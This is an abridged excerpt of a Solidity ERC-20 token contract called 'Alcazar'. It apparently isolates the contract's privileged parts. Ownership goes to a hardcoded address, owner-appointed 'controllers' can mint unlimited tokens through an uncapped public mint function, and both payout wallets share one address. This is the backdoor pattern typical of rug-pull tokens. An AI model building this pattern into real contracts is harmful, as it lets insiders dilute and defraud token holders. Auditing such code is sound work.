...
contract Alcazar is Context, IERC20, Ownable {
    ...
    // wallets
    address payable public liquidityWallet = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address payable public operationsWallet =  payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ...
    event ControllerUpdated(address indexed controller, bool isController);
    ...
    constructor () {
        ...
        transferOwnership(0x1E1D8D811c11d33B75AB66573282fba28904bC66);
    ...
    function setController(address account, bool isController)  public onlyOwner {
        controller[account] = isController;
        emit ControllerUpdated(account, isController);
    }

    function mint(address account, uint256 amount) public {
        require(controller[msg.sender], "need controller!");
         _balances[account] = _balances[account].add(amount);
        _totalSupply =  _totalSupply.add(amount);
         emit Transfer(address(0), account, amount);
    }
